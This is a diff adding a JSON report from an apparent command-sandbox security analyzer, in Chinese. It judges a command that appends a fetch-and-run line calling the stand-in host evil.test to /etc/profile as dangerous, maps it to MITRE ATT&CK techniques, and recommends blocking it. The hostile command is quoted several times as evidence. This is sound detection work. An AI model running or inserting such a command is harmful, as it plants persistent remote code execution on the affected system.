@@ -1,0 +1,292 @@
+{
+  "version": "4.1",
+  "command": "echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile",
+  "timestamp": "2026-03-20T04:04:30.884656+00:00",
+  "verdict": "DANGEROUS",
+  "risk_score": 100,
+  "confidence": "HIGH",
+  "recommendations": [
+    "BLOCK: 强烈建议阻止此命令执行"
+  ],
+  "is_legitimate_pattern": false,
+  "findings_summary": {
+    "total": 4,
+    "critical": 2,
+    "warn": 2,
+    "info": 0,
+    "dimensions_hit": 4
+  },
+  "findings": [
+    {
+      "severity": "WARN",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: download and execute (curl|sh)",
+      "risk_score": 25,
+      "mitre_attack": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "evidence": "echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile"
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "文件变更",
+      "description": "敏感路径写入: ['/etc/profile']",
+      "risk_score": 35,
+      "mitre_attack": [
+        {
+          "id": "T1222.002",
+          "name": "File/Dir Permissions Modification: Linux"
+        }
+      ],
+      "evidence": "['/etc/profile']"
+    },
+    {
+      "severity": "WARN",
+      "dimension": "Shell环境",
+      "description": "Shell 配置文件被修改",
+      "risk_score": 20,
+      "mitre_attack": [
+        {
+          "id": "T1546.004",
+          "name": "Event Triggered Execution: .bash_profile/.bashrc"
+        }
+      ]
+    },
+    {
+      "severity": "CRITICAL",
+      "dimension": "内容分析",
+      "description": "Shell 配置含恶意内容: download and execute (curl|sh)",
+      "risk_score": 25,
+      "mitre_attack": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "evidence": "download and execute (curl|sh)"
+    }
+  ],
+  "evidence": {
+    "stdout_lines": 0,
+    "stderr_lines": 0,
+    "exec_duration_sec": 1.0,
+    "external_connections": [],
+    "c2_port_hits": [],
+    "files_added": 1,
+    "files_deleted": 1,
+    "inotify_sys_events": 1,
+    "inotify_tmp_events": 5461,
+    "exit_code": 0,
+    "critical_bins_changed": false,
+    "new_symlinks": 0,
+    "new_file_caps": 0,
+    "permission_issues": [],
+    "mitre_techniques": [
+      "T1105",
+      "T1222.002",
+      "T1546.004"
+    ]
+  },
+  "dimensions": {
+    "files_added": [
+      "/etc/profile"
+    ],
+    "files_deleted": [
+      "/etc/profile"
+    ],
+    "inotify_sys_events": [
+      "2026-03-20T04:03:48 MODIFY /etc/profile"
+    ],
+    "inotify_tmp_events": [
+      "2026-03-20T04:03:54 CREATE /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX",
+      "2026-03-20T04:03:54 MODIFY /tmp/sortkdWEsX"
+    ],
+    "external_connections": [],
+    "suid_new": [],
+    "suid_removed": [],
+    "new_symlinks": [],
+    "new_file_caps": [],
+    "critical_bins_tampered": false,
+    "high_entropy_files": [],
+    "exit_code": 0,
+    "attack_chains": []
+  },
+  "mitre_attack": {
+    "T1105": {
+      "name": "Ingress Tool Transfer",
+      "findings": [
+        "命令匹配恶意模式: download and execute (curl|sh)",
+        "Shell 配置含恶意内容: download and execute (curl|sh)"
+      ]
+    },
+    "T1222.002": {
+      "name": "File/Dir Permissions Modification: Linux",
+      "findings": [
+        "敏感路径写入: ['/etc/profile']"
+      ]
+    },
+    "T1546.004": {
+      "name": "Event Triggered Execution: .bash_profile/.bashrc",
+      "findings": [
+        "Shell 配置文件被修改"
+      ]
+    }
+  },
+  "mitre_tactics": {
+    "Command and Control": [
+      "T1105"
+    ],
+    "Unknown": [
+      "T1222.002"
+    ],
+    "Persistence": [
+      "T1546.004"
+    ]
+  },
+  "deobfuscation": {
+    "original": "echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile",
+    "deobfuscated": null,
+    "layers": []
+  },
+  "timeline": [
+    {
+      "phase": "baseline",
+      "time": "1773979406",
+      "desc": "基线采集完成"
+    },
+    {
+      "phase": "probes_start",
+      "time": "1773979428",
+      "desc": "探针启动 + 命令执行开始"
+    },
+    {
+      "phase": "exec_end",
+      "time": "1773979429",
+      "desc": "命令执行结束 (耗时 1.0s, 退出码 0)"
+    },
+    {
+      "phase": "post_snapshot",
+      "time": "1773979471",
+      "desc": "后置快照 + 分析完成"
+    }
+  ],
+  "stdout": [],
+  "stderr": [],
+  "text_summary": "🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)\n命令: echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile\n\n发现 4 个问题 (2 严重, 2 警告):\n  [CRITICAL] 文件变更: 敏感路径写入: ['/etc/profile'] [T1222.002]\n  [CRITICAL] 内容分析: Shell 配置含恶意内容: download and execute (curl|sh) [T1105]\n  [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]\n  [WARN] Shell环境: Shell 配置文件被修改 [T1546.004]\n\n涉及 ATT&CK 战术: Command and Control, Persistence, Unknown\n\n建议:\n  • BLOCK: 强烈建议阻止此命令执行",
+  "fast_triage": {
+    "level": "BLOCK",
+    "static_score": 25,
+    "is_legitimate": false,
+    "blacklisted": true,
+    "patterns_matched": 1,
+    "matches": [
+      {
+        "pattern": "download and execute (curl|sh)",
+        "mitre": "T1105",
+        "score": 25
+      }
+    ],
+    "deobfuscation_layers": 0
+  }
+}
